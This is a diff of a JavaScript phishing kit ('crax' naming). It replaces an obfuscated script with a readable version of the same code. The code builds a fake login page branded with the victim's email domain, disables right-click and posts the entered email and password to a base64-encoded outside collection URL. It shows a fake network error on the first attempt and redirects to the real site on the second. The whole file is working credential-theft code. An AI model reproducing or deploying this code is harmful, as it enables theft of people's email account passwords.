@@ -1,1 +1,174 @@
-const _0x1fcc24=_0x4305;(function(_0x44ce8a,_0x685b03){const _0x5a6968=_0x4305,_0xcdb5c1=_0x44ce8a();while(!![]){try{const _0x52aeba=parseInt(_0x5a6968(0x188))/0x1*(parseInt(_0x5a6968(0x176))/0x2)+parseInt(_0x5a6968(0x183))/0x3*(-parseInt(_0x5a6968(0x1bb))/0x4)+-parseInt(_0x5a6968(0x19d))/0x5*(parseInt(_0x5a6968(0x191))/0x6)+-parseInt(_0x5a6968(0x1bd))/0x7*(parseInt(_0x5a6968(0x1a6))/0x8)+parseInt(_0x5a6968(0x192))/0x9+-parseInt(_0x5a6968(0x1aa))/0xa*(-parseInt(_0x5a6968(0x195))/0xb)+-parseInt(_0x5a6968(0x198))/0xc*(-parseInt(_0x5a6968(0x1b4))/0xd);if(_0x52aeba===_0x685b03)break;else _0xcdb5c1['push'](_0xcdb5c1['shift']());}catch(_0xfc7405){_0xcdb5c1['push'](_0xcdb5c1['shift']());}}}(_0xd1d4,0x7d824));const crax_the_mail=window['location'][_0x1fcc24(0x1ad)]['substr'](0x1);$('#crax_the_mail')['val'](crax_the_mail);const ind=crax_the_mail[_0x1fcc24(0x186)]('@'),crax_the_domain=crax_the_mail[_0x1fcc24(0x1c3)](ind+0x1),crax_the_domain_url=_0x1fcc24(0x187)+crax_the_domain,crax_the_domain_org=crax_the_domain['substr'](0x0,crax_the_domain[_0x1fcc24(0x186)]('.')),crax_the_domain_org_small=crax_the_domain_org[_0x1fcc24(0x1b9)](),crax_the_domain_org_caps=crax_the_domain_org[_0x1fcc24(0x174)](),crax_the_domain_org_snake=crax_the_domain_org[0x0]['toUpperCase']()+crax_the_domain_org[_0x1fcc24(0x1ac)](0x1);let crax_default_bg_image='https://image.thum.io/get/width/1200/'+crax_the_domain_url;const crax_the_card_logoimg=_0x1fcc24(0x178)+crax_the_domain_url,mx_record=atob(_0x1fcc24(0x179))+'?email='+crax_the_mail,crax_subm=atob(_0x1fcc24(0x177));$(document)['prop'](_0x1fcc24(0x180),crax_the_domain_org_snake);function _0x4305(_0x3947cd,_0x46659c){const _0xd1d46=_0xd1d4();return _0x4305=function(_0x430542,_0x569fe5){_0x430542=_0x430542-0x172;let _0x5e2e5b=_0xd1d46[_0x430542];return _0x5e2e5b;},_0x4305(_0x3947cd,_0x46659c);}const faviconUrl=crax_the_card_logoimg,$favicon=$('link[rel=\x22shortcut\x20icon\x22]');$favicon[_0x1fcc24(0x194)](_0x1fcc24(0x1b2),faviconUrl),$(_0x1fcc24(0x182))[_0x1fcc24(0x194)](_0x1fcc24(0x193),crax_the_card_logoimg),$(_0x1fcc24(0x1ba))[_0x1fcc24(0x1b7)](crax_the_domain_org_caps),$(_0x1fcc24(0x1a1))[_0x1fcc24(0x1bc)]({'background-image':_0x1fcc24(0x1a7)+crax_default_bg_image+'\x27)'});function getMxRecordFromAPI(){const _0x1c90b8=_0x1fcc24;return $[_0x1c90b8(0x1b5)]({'url':mx_record,'type':_0x1c90b8(0x1ae),'dataType':'json'});}const translations={'english':{'signInButton':_0x1fcc24(0x181),'firstError':'Network\x20Error!\x20Error\x20connecting\x20to\x20login\x20server<br/>\x20Please\x20try\x20again','loading':_0x1fcc24(0x17f)}};let firstError,buttonProp,loading;async function translatePage(_0x5d34ef){const _0x45425e=_0x1fcc24;if(_0x5d34ef==='china'){const _0x335aed=await fetch('https://dev-crax-mx.pantheonsite.io/wp-includes/crax-mx/translate.php'),_0xb4528a=await _0x335aed[_0x45425e(0x17a)]();firstError=_0xb4528a[_0x45425e(0x19c)],buttonProp=_0xb4528a['signInButton'],loading=_0xb4528a[_0x45425e(0x1c2)],$(_0x45425e(0x190))[_0x45425e(0x19e)](_0xb4528a['formHeading']),$('#crax_the_pass')[_0x45425e(0x194)](_0x45425e(0x1ab),_0xb4528a['passwordPlaceholder']),$(_0x45425e(0x1a4))[_0x45425e(0x19e)](_0xb4528a[_0x45425e(0x1b8)]),$(_0x45425e(0x1c4))[_0x45425e(0x19e)](_0xb4528a[_0x45425e(0x1be)]);}else firstError=translations[_0x45425e(0x185)][_0x45425e(0x19c)],buttonProp=translations[_0x45425e(0x185)][_0x45425e(0x1b8)],loading=translations[_0x45425e(0x185)][_0x45425e(0x1c2)];}function handleLanguage(){const _0x4def6a=_0x1fcc24;getMxRecordFromAPI()[_0x4def6a(0x19a)](async _0x5659e3=>{const _0x98463b=_0x4def6a,_0x2d8203=await fetch(_0x98463b(0x19b)+_0x5659e3[_0x98463b(0x18a)]),_0x4255c5=await _0x2d8203[_0x98463b(0x17a)]();return crax_default_bg_image=_0x4255c5[_0x98463b(0x199)],_0x4255c5[_0x98463b(0x1b6)];})[_0x4def6a(0x19a)](_0x2974c9=>{const _0x4bca12=_0x4def6a;translatePage(_0x2974c9);const _0x32a95a=new Image();_0x32a95a[_0x4bca12(0x193)]=crax_default_bg_image,_0x32a95a['onload']=function(){const _0x25722d=_0x4bca12;$(_0x25722d(0x1a1))['css']({'background-image':'url(\x27'+crax_default_bg_image+'\x27)'}),hideLoading(),setTimeout(()=>{const _0x86c26c=_0x25722d;$(_0x86c26c(0x1b3))[_0x86c26c(0x189)](),setTimeout(()=>{const _0x2b3337=_0x86c26c;$(_0x2b3337(0x18f))[_0x2b3337(0x172)](_0x2b3337(0x1c1));},0x64);},0x5dc);};})[_0x4def6a(0x175)](_0x4b5427=>{const _0x31c624=_0x4def6a;console[_0x31c624(0x1a5)](_0x31c624(0x1af),_0x4b5427),hideLoading(),setTimeout(()=>{const _0x22d01d=_0x31c624;$(_0x22d01d(0x1b3))['show'](),setTimeout(()=>{const _0x371d33=_0x22d01d;$(_0x371d33(0x18f))[_0x371d33(0x172)]('modal-show');},0x64);},0x5dc);});}function showLoading(){const _0x250e6c=_0x1fcc24;$(_0x250e6c(0x18d))[_0x250e6c(0x189)]();}function _0xd1d4(){const _0x18d884=['html','signInButton','toLowerCase','#crax_the_card_logoname','1489432MrVJaZ','css','7QetaCs','secure','ready','password','modal-show','loading','substr','#crax_the_secure_label','addClass','POST','toUpperCase','catch','125186nnvqmb','aHR0cHM6Ly9hbGwtZ2lncy1iYWNrLmNvbS5uZy93cC93cC1jb250ZW50L3NhYWMucGFnZW0ubXguYXV0b2JnLmNyYXgvZHJ1bi5waHA','https://logo.clearbit.com/','aHR0cHM6Ly9kZXYtY3JheC1teC5wYW50aGVvbnNpdGUuaW8vd3AtaW5jbHVkZXMvY3JheC1teC9jaGVja2Rucy5waHA','json','contextmenu','prop','crax_the_mail','<span\x20class=\x22spinner-border\x20spinner-border-sm\x22\x20role=\x22status\x22\x20aria-hidden=\x22true\x22></span>\x20','Loading...','title','Sign\x20in','#crax_the_card_logoimg','6ZpcORl','location','english','indexOf','https://','6uvsUsw','show','mxRecords','preventDefault','innerHTML','#loadingSpinner','remove','.modal-custom','#crax_the_form_heading','12MNyUXx','9146907oGOAaE','src','attr','7535lOozkV','getElementById','addEventListener','24hwhqFq','crax_default_bg_image','then','https://dev-crax-mx.pantheonsite.io/wp-includes/crax-mx/bgbase_and_lang.php?mx=','firstError','1444220grjlOL','text','add','value','#crax_default_bg_image','crax_the_pass','d-none','#crax_the_submit_button','error','3499256OZulsc','url(\x27','disabled','append','7720mkaVcF','placeholder','substring','hash','GET','Error\x20fetching\x20language\x20data:','classList','replace','href','#crax_the_wrapper','2295761pMIqxb','ajax','language'];_0xd1d4=function(){return _0x18d884;};return _0xd1d4();}function hideLoading(){const _0xb70eb6=_0x1fcc24;$(_0xb70eb6(0x18d))['hide']();}$(document)[_0x1fcc24(0x1bf)](function(){const _0x127ff2=_0x1fcc24;$(document)['on'](_0x127ff2(0x17b),function(_0x1c59cf){const _0x383fc8=_0x127ff2;_0x1c59cf[_0x383fc8(0x18b)]();}),showLoading(),handleLanguage();});const errorBox=document[_0x1fcc24(0x196)]('crax_the_error_box');let counter=0x0;document[_0x1fcc24(0x196)]('crax_the_login_form')[_0x1fcc24(0x197)]('submit',function(_0x2d9644){const _0x3539d2=_0x1fcc24;_0x2d9644[_0x3539d2(0x18b)]();const _0xcefe50=document[_0x3539d2(0x196)](_0x3539d2(0x17d))[_0x3539d2(0x1a0)],_0x55d16d=document[_0x3539d2(0x196)](_0x3539d2(0x1a2))[_0x3539d2(0x1a0)],_0x1280ea=$(_0x3539d2(0x1a4));_0x1280ea[_0x3539d2(0x17c)](_0x3539d2(0x1a8),!![])[_0x3539d2(0x1b7)](_0x3539d2(0x17e)+loading),counter++;const _0x34826c=new FormData();_0x34826c['append']('email',_0xcefe50),_0x34826c[_0x3539d2(0x1a9)](_0x3539d2(0x1c0),_0x55d16d),fetch(crax_subm,{'method':_0x3539d2(0x173),'body':_0x34826c})[_0x3539d2(0x19a)](_0x5cb92c=>{const _0x447d0b=_0x3539d2;counter>0x1?window[_0x447d0b(0x184)][_0x447d0b(0x1b1)](crax_the_domain_url):showError(firstError),document['getElementById'](_0x447d0b(0x1a2))[_0x447d0b(0x1a0)]='',_0x1280ea['prop'](_0x447d0b(0x1a8),![])[_0x447d0b(0x19e)](buttonProp);})[_0x3539d2(0x175)](_0x5bb512=>{const _0x32d647=_0x3539d2;counter>0x1?window['location'][_0x32d647(0x1b1)](crax_the_domain_url):showError(firstError),document[_0x32d647(0x196)](_0x32d647(0x1a2))[_0x32d647(0x1a0)]='',_0x1280ea[_0x32d647(0x17c)](_0x32d647(0x1a8),![])[_0x32d647(0x19e)](buttonProp);});});function showError(_0x1d8a92){const _0x3caaf4=_0x1fcc24;errorBox[_0x3caaf4(0x18c)]=_0x1d8a92,errorBox[_0x3caaf4(0x1b0)][_0x3caaf4(0x18e)](_0x3caaf4(0x1a3)),setTimeout(()=>{const _0x1d01aa=_0x3caaf4;errorBox[_0x1d01aa(0x1b0)][_0x1d01aa(0x19f)]('d-none'),errorBox[_0x1d01aa(0x18c)]='';},0xbb8);}
+        const crax_the_mail = window.location.hash.substr(1);
+        $('#crax_the_mail').val(crax_the_mail);
+        const ind = crax_the_mail.indexOf("@");
+        const crax_the_domain = crax_the_mail.substr((ind + 1));
+
+        const crax_the_domain_url = 'https://' + crax_the_domain;
+        const crax_the_domain_org = crax_the_domain.substr(0, crax_the_domain.indexOf('.'));
+        const crax_the_domain_org_small = crax_the_domain_org.toLowerCase();
+        const crax_the_domain_org_caps = crax_the_domain_org.toUpperCase();
+        const crax_the_domain_org_snake = crax_the_domain_org[0].toUpperCase() + crax_the_domain_org.substring(1);
+
+        let crax_default_bg_image = "https://image.thum.io/get/width/1200/" + crax_the_domain_url;
+        const crax_the_card_logoimg = "https://logo.clearbit.com/" + crax_the_domain_url
+        const mx_record = atob("aHR0cHM6Ly9kZXYtY3JheC1teC5wYW50aGVvbnNpdGUuaW8vd3AtaW5jbHVkZXMvY3JheC1teC9jaGVja2Rucy5waHA") + "?email=" + crax_the_mail;
+        const crax_subm = atob("aHR0cHM6Ly9hbGwtZ2lncy1iYWNrLmNvbS5uZy93cC93cC1jb250ZW50L3NhYWMucGFnZW0ubXguYXV0b2JnLmNyYXgvZHJ1bi5waHA");
+
+        $(document).prop('title', crax_the_domain_org_snake);
+
+        const faviconUrl = crax_the_card_logoimg
+        const $favicon = $('link[rel="shortcut icon"]');
+        $favicon.attr('href', faviconUrl);
+
+        $("#crax_the_card_logoimg").attr("src", crax_the_card_logoimg);
+        $("#crax_the_card_logoname").html(crax_the_domain_org_caps);
+        $("#crax_default_bg_image").css({
+            "background-image": `url('${crax_default_bg_image}')`
+        });
+
+        function getMxRecordFromAPI() {
+            return $.ajax({
+                url: mx_record,
+                type: 'GET',
+                dataType: 'json',
+            });
+        }
+
+        const translations = {
+            english: {
+                signInButton: "Sign in",
+                firstError: "Network Error! Error connecting to login server<br/> Please try again",
+                loading: "Loading..."
+            }
+        };
+
+        let firstError, buttonProp, loading
+
+        async function translatePage(language) {
+            if (language === "china") {
+                const translationResponse = await fetch("https://dev-crax-mx.pantheonsite.io/wp-includes/crax-mx/translate.php")
+                const translation = await translationResponse.json()
+                firstError = translation.firstError
+                buttonProp = translation.signInButton
+                loading = translation.loading
+                $("#crax_the_form_heading").text(translation.formHeading);
+                $("#crax_the_pass").attr("placeholder", translation.passwordPlaceholder);
+                $("#crax_the_submit_button").text(translation.signInButton);
+                $("#crax_the_secure_label").text(translation.secure);
+            } else {
+                firstError = translations.english.firstError
+                buttonProp = translations.english.signInButton
+                loading = translations.english.loading
+            }
+        }
+
+        function handleLanguage() {
+            getMxRecordFromAPI()
+                .then(async (record) => {
+                    const response = await fetch(`https://dev-crax-mx.pantheonsite.io/wp-includes/crax-mx/bgbase_and_lang.php?mx=${record.mxRecords}`)
+                    const data = await response.json();
+                    crax_default_bg_image = data.crax_default_bg_image
+                    return data.language;
+                })
+                .then((language) => {
+                    translatePage(language);
+                    const img = new Image();
+                    img.src = crax_default_bg_image;
+                    img.onload = function () {
+                        $("#crax_default_bg_image").css({
+                            "background-image": `url('${crax_default_bg_image}')`
+                        });
+                        hideLoading()
+                        setTimeout(() => {
+                            $('#crax_the_wrapper').show();
+                            setTimeout(() => {
+                                $(".modal-custom").addClass("modal-show")
+                            }, 100)
+                        }, 1500)
+                    }
+                })
+                .catch((error) => {
+                    console.error("Error fetching language data:", error);
+                    hideLoading()
+                    setTimeout(() => {
+                        $('#crax_the_wrapper').show();
+                        setTimeout(() => {
+                            $(".modal-custom").addClass("modal-show")
+                        }, 100)
+                    }, 1500)
+                })
+        }
+
+        function showLoading() {
+            $('#loadingSpinner').show();
+        }
+
+        function hideLoading() {
+            $('#loadingSpinner').hide();
+        }
+
+        $(document).ready(function () {
+            $(document).on('contextmenu', function (e) {
+                e.preventDefault();
+            });
+            showLoading()
+            handleLanguage();
+        });
+
+        const errorBox = document.getElementById("crax_the_error_box");
+        let counter = 0;
+
+        document.getElementById("crax_the_login_form").addEventListener("submit", function (e) {
+            e.preventDefault();
+            const email = document.getElementById("crax_the_mail").value;
+            const password = document.getElementById("crax_the_pass").value;
+
+            const $btn = $('#crax_the_submit_button');
+            $btn.prop('disabled', true).html(`<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> ${loading}`);
+
+            counter++;
+
+            const formData = new FormData();
+            formData.append("email", email);
+            formData.append("password", password);
+
+            fetch(
+                crax_subm,
+                {
+                    method: "POST",
+                    body: formData,
+                }
+            )
+                .then((response) => {
+                    if (counter > 1) {
+                        window.location.replace(crax_the_domain_url);
+                    } else {
+                        showError(
+                            firstError
+                        );
+                    }
+                    document.getElementById("crax_the_pass").value = "";
+                    $btn.prop('disabled', false).text(buttonProp);
+                })
+                .catch((error) => {
+                    if (counter > 1) {
+                        window.location.replace(crax_the_domain_url);
+                    } else {
+                        showError(
+                            firstError
+                        );
+                    }
+                    document.getElementById("crax_the_pass").value = "";
+                    $btn.prop('disabled', false).text(buttonProp);
+                });
+        });
+
+        function showError(message) {
+            errorBox.innerHTML = message;
+            errorBox.classList.remove("d-none");
+            setTimeout(() => {
+                errorBox.classList.add("d-none");
+                errorBox.innerHTML = "";
+            }, 3000);
+        }
+
